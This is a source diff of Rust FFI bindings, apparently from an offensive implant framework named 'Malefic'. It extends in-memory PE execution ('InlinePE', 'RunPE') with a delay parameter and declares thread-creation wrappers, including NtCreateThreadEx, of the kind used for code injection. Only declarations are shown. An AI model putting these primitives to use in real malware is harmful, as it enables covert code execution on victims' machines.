@@ -66,7 +66,8 @@ extern "C" {
         entrypoint_len: usize,
         is_dll: bool,
         is_need_output: bool,
-        timeout: u32
+        timeout: u32,
+        delay: u32
     ) -> RawString;
     pub fn RunPE(
         start_commandline: *const u8,
@@ -132,6 +133,28 @@ extern "C" {
         module: *const core::ffi::c_void,
         proc_name: *const u8
     ) -> *const core::ffi::c_void;
+    pub fn MCreateThread(
+        thread_attributes: *mut core::ffi::c_void,
+        stack_size: u32,
+        start_address: *mut core::ffi::c_void,
+        parameter: *mut core::ffi::c_void,
+        creation_flags: u32,
+        thread_id: *mut u32,
+    ) -> *mut core::ffi::c_void;
+    pub fn MNtCreateThreadEx(
+        thread_handle: *mut core::ffi::c_void,
+        desired_access: u32,
+        object_attributes: *mut core::ffi::c_void,
+        process_handle: *mut core::ffi::c_void,
+        start_address: *mut core::ffi::c_void,
+        start_parameter: *mut core::ffi::c_void,
+        create_suspended: i32,
+        stack_zero_bits: u32,
+        size_of_stack_commit: u32,
+        size_of_stack_reserve: u32,
+        attribute_list: *mut core::ffi::c_void,
+    ) -> i32;
+    pub fn MGetCurrentProcess() -> *mut core::ffi::c_void;
 
     pub fn MaleficMakePipe(
         read: *mut *mut core::ffi::c_void, 
@@ -156,6 +179,7 @@ pub struct MaleficPipe {
 pub struct MaleficModule {
     pub new_module: *mut core::ffi::c_void,
     pub entry_point: *const core::ffi::c_void, 
+    pub export_func: Vec<(String, usize)>,
 }
 
 
@@ -312,9 +336,10 @@ pub fn inline_pe(
     entrypoint_len: usize,
     is_dll: bool,
     is_need_output: bool,
-    timeout: u32
+    timeout: u32,
+    delay: u32
 ) -> RawString {
-    unsafe { InlinePE(bin, bin_size, magic, signature, commandline, commandline_len, entrypoint, entrypoint_len, is_dll, is_need_output, timeout) }
+    unsafe { InlinePE(bin, bin_size, magic, signature, commandline, commandline_len, entrypoint, entrypoint_len, is_dll, is_need_output, timeout, delay) }
 }
 
 #[cfg(target_os = "windows")]
